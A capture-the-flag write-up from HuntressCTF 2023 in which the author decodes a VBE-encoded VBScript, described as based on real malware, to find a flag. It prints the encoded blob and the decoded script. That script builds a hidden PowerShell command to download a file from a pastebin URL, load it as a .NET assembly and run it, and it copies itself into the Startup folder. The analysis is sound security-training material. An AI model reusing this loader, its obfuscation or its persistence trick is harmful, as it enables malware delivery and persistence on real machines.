---
title: 2023 HuntressCTF - VeeBeeEee
date: 2023-10-06T15:04:11-06:00
tags:
  - wscript
  - vbs
  - malware
image: /2023-HuntressCTF/veebeeeee.png
---

### Summary
```
Author: @JohnHammond

While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?

NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.

```

### Steps

I started this challenge in my linux VM.  After downloading the file ```veebeeEee``` and I executed ```file veebeeEee``` and received this response:
```bash
veebeeEee: data
```
Unsure at this point I used cat to look at the file contents and here is what I found:
```bash
#@~^fhAAAA==jY~}4N+mDP,xPq?^DbwO ;D+mO+}4L^O`rUm.k2Oc?4+^sJ*PvvEBBvvEBvBEvEBvmV2GXkWGwsBCV2GzdK+Wah@&U+Y,j64N+1Y~'~/M+CY64N+^OvJ?4n^V ba2^k^mYbWxr#EvBEBvBEBvvEBBEvl^&GHdG+KwsBCVf{H/G+K2:@&?nO,sr8%mOP{~;DnmYr4N+1O`r?^DbwOr	oRwrV?XkOn:}4N+^YEbEBvBEvBEBvvEBBvvmVfGHdK+Ga:ElV2GHdWW2:@&?KCDtP,~',?1.rwDRUm.k2OwEsVgC:BvvEBBvvEBvBEvEBC^&FX/K+K2:Els&FXdGWws@&fb:P;G[+EBEBvBvvEBvBEvBElsfFX/GnKwhBms2GzkWWws@&EvBEBvBEBvvEBBEvl^&GHdG+KwsBCVf{H/G+K2:@&nGAD!~x,JKWrvEBvEBEBBEBEvBEBCV2GzdK+WahBmV&FzdWWa:@&nGADqP{~JS+EvEBBvvEBvBEvEBvEl^&GH/KnWa:vl^&{zkW+K2:@&nWSn. ,',J.?EvEBvBEvBEBvvEBBvC^&{XkGW2sBmV&FXkG+Kwh@&hWAnM&P{~J4+J@&KGhDWPxPEs^JvBEvBEBvvEBBvvEBCV2{H/GWa:BmV2{XkWnWa:@&KKh+MXP{PJ,EvBEBEBvBvvEBvBEvl^&{zkW+G2sBCV2{H/GWa:@&hWSnD,'~nKhn.ZP_,KWS+D8~QPhWS+. ~Q,nGh.&,_~KKh+.*,_~nKADXEBEBBEBEvBEBvBEBCs2GXkG+Kw:ECs&FXkWnW2h@&BvBEvBEBvvEBBvvEls&FzkWnKwsBl^&Fz/K+Gws@&KCDt!,xPr[^LW'[{[E['Z'EEBvBEvBEBvvEBBvvmVfGHdK+Ga:ElV2GHdWW2:@&nCO4FP{~JL)[''i[k[['DdE,BvBEvBEBvvEBBvvEls&FzkWnKwsBl^&Fz/K+Gws@&KCDt ,xPr[-h''EL4LV'k''1[EBEvBEBvvEBBvvEBvl^fFXdK+Kw:El^fGH/G+Kwh@&hlY4fP{PJ'9'[K[1[;[hnrPvBEvBEBvvEBBvvEBCV2{H/GWa:BmV2{XkWnWa:@&KmYtW~',JxLOd['[L9'E'sHJvBEvBEBvvEBBvvEBCV2{H/GWa:BmV2{XkWnWa:@&KmYtl~',J[c4'YL[s[viEvEBvBEvBEBvvEBBvC^&{XkGW2sBmV&FXkG+Kwh@&hlO4,PP{~nmYtZ~QPhlDtqPQ~hlOty~_,nCO4&PQ~hlOtW~3PKmY4*BEBEvBEBvBEBvvEBl^fGH/WG2:El^&{XdGW2:@&vBEBvvEBBvvEBvBEC^&{H/K+Wa:ECV2Gz/K+G2sBBEvBEBBEvvBEBEBCVf{H/G+K2:ElsfFX/GnKwh@&"n$+dD!,'Pr[b'[6P'`L"cPL+[kO[ n[mO4PL^L0b[b`L[([	'\LW'V[O'	L+8[L]L+5LEL[+L/LOPEJvBEBvvEBBEvBEBBECs&FXkWnW2hEls&Fz/K+G2s@&In5/OF,x,J'4[D[YLwLd[=[&[J[2'm[/LOJEBBEvvBEBEBvBvvEls&Fz/K+G2sBlsfFXdWGa:@&"+$+/D ,xPr[n[([r'	[RL^[K[:L&'DLlLhEBvvEBvBEvBEBvvEBlsfFXdWGa:vmV2GXkWGws@&]+$+dO2P',E[J[?Lr'5LMLh'h'^Ly'JEvBEBvvEBBvvEBvBms2GzkWWwsBms&FXdWW2h@&I+$n/DcP{~EBLPLOG[;'rBvBEvBEBvvEBBvvEls&FzkWnKwsBl^&Fz/K+Gws@&]n$+/DXP{PJD'W[b[^+~[yWLP~[)IJEBvvEBBvvEBvBEvEls2GH/WWahBmVfGH/GnKw:@&]+$+/D~xP"+$+dYT~3P]+$n/DF~Q,I+5nkY+P3~,In$+kY&,_,]+$+dYWPQ~"+;dYlBBEvvBEBEBvBvvEBCV2{XkWnGa:BCs2Gz/KnKwh@&nmYtUYMrxTPxPUr8%mYcHls+?aC^+vG*Rj+sWcnCY4~[,J&E,[P	j1DrwD Um.bwD1ls+EvBEBvBEBvvEBBEvl^&GHdG+KwsBCVf{H/G+K2:@&qU-K3+]n$+dYZ~{PEL$L?[H[k'YL+':LREvEBBEvBEBBEvvBEBmVfGzdK+Gwsvl^&{zkW+G2s@&(x7G0+];/Y8P{~JLI'+L0'sL+[1'YLk[rvvBEBEBvBvvEBvBECV2GzdK+W2hEls&FzkWnKws@&q	\KV+"+5+kY+~{PJK'xLR[z'd[k[[h[8'^JvBEvBEBvvEBBvvEBCV2{H/GWa:BmV2{XkWnWa:@&(	\W0nI;+kOfP{Pr[z[D'=[l[^'WLl'[L0J~vEBvBEvEBvEBEBBEl^fGH/G+KwhvmV&Fz/K+Wah@&q	\K3nIn5/Oc,xPr[r'^[+c'f[EBEvEBvEBEBBEBEvBmVfGH/GnKw:ECV2GXkGnWa:@&qU\GVIn;dYlPx~r0[b'p[EBEvEBvEBEBBEBEvBmVfGH/GnKw:ECV2GXkGnWa:@&qU\GVIn;dY,'~(	\WVn"+5+kOZPQ,q	\W0+"n;/OF,_~(	\W0nI;+kO+P3P&x-WVn"+5+kO&,_~(	\WVn"+5+kOWPQ,q	\W0+"n;/O*EBvvEBBEvBEBBEvvl^&FXdWnGa:vl^fGH/GnKw:@&vEBvBEvEBvEBEBBEl^fGH/G+KwhvmV&Fz/K+Wah@&2X+1bd/nhZPxPr'$L'GLD[VEEBvBEvEBvEBEBBEBms&FXdWW2hElV2{XkW+K2h@&A6m)/dnsF~',E[z[.'[l' rBvBEvEBvEBEBBEBECV2Gz/K+G2sBl^fGH/WG2:@&2X+^bdd:+P{~JL'GL[D'VrBvBEvEBvEBEBBEBECV2Gz/K+G2sBl^fGH/WG2:@&2X+^bdd:fP{~JY[l'rBBvvEBvBEvEBvEBElV2GHdWW2:ElsfFX/KnWa:@&Aanmz/k+hc~x,Jl[A'6LJ~vEBBvvEBvBEvEBvEl^&GH/KnWa:vl^&{zkW+K2:@&26^)/k+s*~'~E`'#LEBEBvvEBBvvEBvBEvmVfFXkW+Kwsvl^&{XkWnGa:@&Aa+1b/knhP,P{P36n^z/d+sTP3P3ambdd:qP3~A6n1bk/+s ,QPA6nmz/dns&P3~2X+mzdd+sc,_~2an1bd/h*EBvvEBBvvEBvBEvEls2GH/WWahBmVfGH/GnKw:@&vBEBBEvvBEBEBvBvC^&{XkG+KwhvmV&{zkWnWah@&ZG^VmY:tUIwsl1+~KKh+M~~,nlD4~~,I;n/O~BP(x7G3In5/Y~S,2a+1)k/ns@&EBBEBEvBEBvBEBvvmV&Fz/K+Wahvl^&FXdWnGa:@&@&U;4,ZGs^+mOP4+UI2^l^`wkDkYB~?mGx9PS~:tkM[PBPsK;.Y4PBPokWO4#vBEvBEBvvEBBvvEBCV2{H/GWa:BmV2{XkWnWa:@&P:w,xPwkDkO~_,?mGx[~3PPtb.N,_~oKEDO4,_~sbWDtvEBEBBEBEvBEBvBElsfFX/KnWa:BmsfGH/K+Gwh@&;W[+,xP"+2smm+cP:2PB~r[E,~,JJ,#EvBEBvBEBvvEBBEvl^&GHdG+KwsBCVf{H/G+K2:@&2U[,?E8vEBvBEvEBvEBEBBEl^fGH/G+KwhvmV&Fz/K+Wah@&BEBEBvBvvEBvBEvBmVf{H/WnGa:vl^fFXdK+Kw:@&IOEMx~',r8%mYc]E	`ZK[n~,!BPOD;n*BvBEvBEBvvEBBvvEls&FzkWnKwsBl^&Fz/K+Gws@&vvEBBEvBEBBEvvBEl^&{XdGW2:ECV2GzdK+W2h@&jmMraY UV+wv*ZT!Z#vBEBvvEBBEvBEBBECs&FXkWnW2hEls&Fz/K+G2s@&sG.,k~',q,KG,*EBBEBEvBEBvBEBvvmV&Fz/K+Wahvl^&FXdWnGa:@&k6~k,'~X,KtnUEBvBEvEBvEBEBBEBms&FXdWW2hElV2{XkW+K2h@&hlkYn`jKmY4#@&3x9PrWEBBvvEBvBEvEBvEBmV&FXkG+KwhBmVf{H/WGws@&1aOBEBEBvBvvEBvBEvBmVf{H/WnGa:vl^fFXdK+Kw:@&?!8PhldY`]P*@&s}8LmYc/GwHsbVnP]PBnCY4jYMkUL@&2x[~UE8yLIEAA==^#~@%
```

Looking back at the challenge description, I see that may have been executed by wscript.  Looking at [Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wscript) I see that wscript can execute .wsf, .vbs, and .js files.  The text looks heavly obfuscated, so I started to research for .wsf, .vbs and .js deobfuscation tools, and I discovered [vbe-decoder](https://github.com/JohnHammond/vbe-decoder) by John Hammond, so I knew this was the right path.  Using John's script, I executed ```python3 ./vbe-decoder.py veebeeEee > veebeeeee.vbs``` and received the following deobfuscated text.
```vbs
Set Object  = WScript.CreateObject("WScript.Shell") ''''''''''''''''al37ysoeopm'al37ysoeopm
Set SObject = CreateObject("Shell.Application")''''''''''''''''al37ysoeopm'al37ysoeopm
Set FObject = CreateObject("Scripting.FileSystemObject")''''''''''''''''al37ysoeopm'al37ysoeopm
SPath   = WScript.ScriptFullName''''''''''''''''al37ysoeopm'al37ysoeopm
Dim Code''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
Power0 = "Po"''''''''''''''''al37ysoeopm'al37ysoeopm
Power1 = "we"''''''''''''''''al37ysoeopm'al37ysoeopm
Power2 = "rS"''''''''''''''''al37ysoeopm'al37ysoeopm
Power3 = "he"
Power4 = "ll"''''''''''''''''al37ysoeopm'al37ysoeopm
Power5 = " "''''''''''''''''al37ysoeopm'al37ysoeopm
Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
Path0 = "&$&f&&=&'&&C&"''''''''''''''''al37ysoeopm'al37ysoeopm
Path1 = "&:&\&U&s&e&&rs" ''''''''''''''''al37ysoeopm'al37ysoeopm
Path2 = "&\P&&u&b&l&i&&c&"''''''''''''''''al37ysoeopm'al37ysoeopm
Path3 = "\D&&o&c&u&me" ''''''''''''''''al37ysoeopm'al37ysoeopm
Path4 = "n&ts&\&&J&u&ly"''''''''''''''''al37ysoeopm'al37ysoeopm
Path5 = "&.h&t&&m&';"''''''''''''''''al37ysoeopm'al37ysoeopm
Path   = Path0 + Path1 + Path2 + Path3 + Path4 + Path5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest0 = "&i&&f &(&!(T&e&st&-P&ath &$&f)&){&&I&n&v&o&ke&-&W&eb&&R&eq&u&&e&s&t '"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest1 = "&h&t&t&p&s&:&/&/&p&a&s&t"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest2 = "&e&b&i&n&.&c&o&m&/&r&a&w"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest3 = "&/&S&i&Y&G&w&w&c&z&"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest4 = "'& &-o&u&"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest5 = "t&f&i&le &$f&  &};"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5''''''''''''''''al37ysoeopm'al37ysoeopm
PathString = SObject.NameSpace(7).Self.Path & "/" & WScript.ScriptName''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest0 = "&[&S&y&s&t&e&m&."''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest1 = "&R&e&f&l&e&c&t&i&"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest2 = "o&n&.&A&s&s&e&m&b&l"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest3 = "&y&]&:&:&l&o&a&d&f" ''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest4 = "&i&l&e(&$&"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest5 = "f&)&;&"''''''''''''''''al37ysoeopm'al37ysoeopm
InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem0 = "&[&W&o&r&k"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem1 = "&A&r&e&a&."''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem2 = "&W&o&&r&k"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem3 = "]&:&"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem4 = ":&E&x&" ''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem5 = "e(&)&"''''''''''''''''al37ysoeopm'al37ysoeopm
ExecAssem   = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
CollectThenReplace Power , Path , Reqest , InvokeReqest , ExecAssem
''''''''''''''''al37ysoeopm'al37ysoeopm

Sub CollectThenReplace(First, Second , Third , Fourth , Fifth)''''''''''''''''al37ysoeopm'al37ysoeopm
Temp = First + Second + Third + Fourth + Fifth''''''''''''''''al37ysoeopm'al37ysoeopm
Code = Replace(Temp , "&" , "" )''''''''''''''''al37ysoeopm'al37ysoeopm
End Sub''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
Return = Object.Run(Code, 0, true)''''''''''''''''al37ysoeopm'al37ysoeopm
''''''''''''''''al37ysoeopm'al37ysoeopm
WScript.Sleep(50000)''''''''''''''''al37ysoeopm'al37ysoeopm
For i = 1 To 5''''''''''''''''al37ysoeopm'al37ysoeopm
if i = 5 Then''''''''''''''''al37ysoeopm'al37ysoeopm
Paste(SPath)
End if''''''''''''''''al37ysoeopm'al37ysoeopm
Next''''''''''''''''al37ysoeopm'al37ysoeopm
Sub Paste(RT)
FObject.CopyFile RT,PathString
End Sub%  
```

At this point, I moved over to a Windows virtual machine and pasted the script into Notepad+++ and used syntax highlight for Visual Basic to help read the file better.
![](/2023-HuntressCTF/notepadplusplus.png)

Looking at the code, I see the Power* variables are calling PowerShell.

![](/2023-HuntressCTF/powershell.png)

I also noticed this script has some comments that don't appear to be related, for the sake of readability, I removed all occurances of ```''''''''''''''''al37ysoeopm'al37ysoeopm```

Continuing to manually deobfuscate the code, I wanted to see the full path for the Reqest variable.  I created a request0.vbs script with the following code.  Here the goal is use wscript.echo to print out the Reqest variable.
```vbs
Reqest0 = "if (!(Test-Path $f)){Invoke-WebRequest '"
Reqest1 = "https://past"
Reqest2 = "ebin.com/raw"
Reqest3 = "/SiYGwwcz"
Reqest4 = "' -ou"
Reqest5 = "tfile $f  };"
Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5

wscript.echo Reqest
```

Using the Windows VM I executed request0.vbs and I received a popup box with the full URL.  

![](/2023-HuntressCTF/wscriptecho.png)

Investigating the Pastebin URL I discoverd the flag.
![](/2023-HuntressCTF/veebeeeeflag.png)

flag: ```flag{ed81d24958127a2adccfb343012cebff}```
